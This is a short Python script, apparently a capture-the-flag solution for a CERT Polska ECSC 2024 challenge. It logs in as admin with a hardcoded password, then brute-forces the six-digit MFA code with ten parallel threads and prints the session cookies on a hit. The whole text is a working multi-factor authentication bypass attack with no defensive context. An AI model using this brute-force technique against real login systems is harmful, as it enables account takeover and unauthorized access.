import requests
from threading import Thread
from random import randint

s = requests.Session()

s.post('https://1fa.ecsc24.hack.cert.pl/login', data={
    'login': 'admin',
    'password': 'RobertR@c!ng#24'
})


def run():
    global s

    while True:
        code = randint(0, 10**6)
        res = s.post('https://1fa.ecsc24.hack.cert.pl/mfa', data={
            'mfa_code': str(code).zfill(6)
        })

        if not 'MFA verification failed!' in res.text:
            print(res.text)
            print(s.cookies)


for i in range(10):
    t = Thread(target=run)
    t.start()
